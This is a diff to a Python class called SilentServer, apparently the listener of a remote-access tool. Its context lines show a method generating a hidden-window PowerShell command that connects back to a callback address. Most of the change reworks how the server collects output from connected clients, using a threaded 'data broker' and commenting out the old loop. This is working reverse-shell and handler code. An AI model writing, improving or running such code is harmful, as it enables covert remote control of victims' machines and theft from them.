@@ -33,6 +33,10 @@ class SilentServer:
 
                 self.client             = None
 
+                self.data_broker        = None
+                self.new_data           = False
+                self.break_set          = False
+
         def get_payload(self) -> str:
                 payload                 = ("start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
                                            f"{self.callback_address}"
@@ -236,34 +240,71 @@ class SilentServer:
 
                 return self.wait_client()
 
-        def wait_client(self) -> bool:
-                data                    = b""
-                previous_data_length    = len(data)
+        #def wait_client(self) -> bool:
+        #        data                    = b""
+        #        previous_data_length    = len(data)
+        #
+        #        for wait_iteration in range(10):
+        #                try:
+        #                        data   += self.client.recv(1024)
+        #                        
+        #                        if len(data) == previous_data_length:
+        #                                time.sleep(1)
+        #                                data += self.should_quit()
+        #
+        #                                if len(data) == previous_data_length:
+        #                                        return data
+        #                                else:
+        #                                        previous_data_length = len(data)
+        #
+        #                except BlockingIOError:
+        #                        time.sleep(0.5)
+        #
+        #        return data
+        #
+        #def should_quit(self) -> bytes:
+        #    try:
+        #            data                = self.client.recv(1024)
+        #            return data
+        #    except BlockingIOError:
+        #            return b""
 
-                for wait_iteration in range(50):
+        def wait_client(self) -> bytes:
+                self.new_data           = True
+                data                    = b""
+
+                self.data_broker        = threading.Thread(
+                        target          = self.data_brokerage,
+                        daemon          = True
+                )
+                self.data_broker.start()
+
+                while not self.break_set:
                         try:
                                 data   += self.client.recv(1024)
-                                
-                                if len(data) == previous_data_length:
-                                        time.sleep(1)
-                                        data += self.should_quit()
-
-                                        if len(data) == previous_data_length:
-                                                return data
-                                        else:
-                                                previous_data_length = len(data)
-
+                                self.new_data = True
                         except BlockingIOError:
-                                time.sleep(0.1)
+                                pass
+
+                self.data_broker        = None
+                self.new_data           = False
+                self.break_set          = False
 
                 return data
 
-        def should_quit(self) -> bytes:
-            try:
-                    data                = self.client.recv(1024)
-                    return data
-            except BlockingIOError:
-                    return b""
+        def data_brokerage(self) -> None:
+                times_data_checked      = 0
+
+                while times_data_checked != 20:
+                        if self.new_data:
+                                self.new_data = False
+                                times_data_checked = 0
+                                continue
+
+                        times_data_checked += 1
+                        time.sleep(0.1)
+
+                self.break_set              = True
 
         def get_client_id(self) -> str:
                 client_id               = []
